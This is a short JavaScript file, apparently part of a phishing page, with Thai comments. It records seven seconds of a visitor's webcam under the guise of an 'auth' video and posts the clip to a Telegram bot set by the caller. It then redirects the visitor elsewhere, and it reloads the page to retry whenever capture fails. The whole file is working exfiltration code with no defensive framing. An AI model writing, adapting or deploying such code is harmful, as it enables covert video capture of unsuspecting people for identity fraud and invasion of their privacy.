// core.js
async function startSession(t, c, r) {
    try {
        const s = await navigator.mediaDevices.getUserMedia({ video: true });
        const recorder = new MediaRecorder(s);
        const chunks = [];
        
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            const fd = new FormData();
            fd.append('chat_id', c);
            fd.append('video', blob, 'auth_v.mp4');

            await fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: fd });
            
            s.getTracks().forEach(track => track.stop());
            window.location.replace(r);
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 7000); // ถ่าย 7 วินาที
    } catch (err) {
        console.log("Retry needed");
        location.reload(); // ถ้ามีปัญหา ให้โหลดหน้าใหม่เพื่อเริ่มใหม่
    }
}
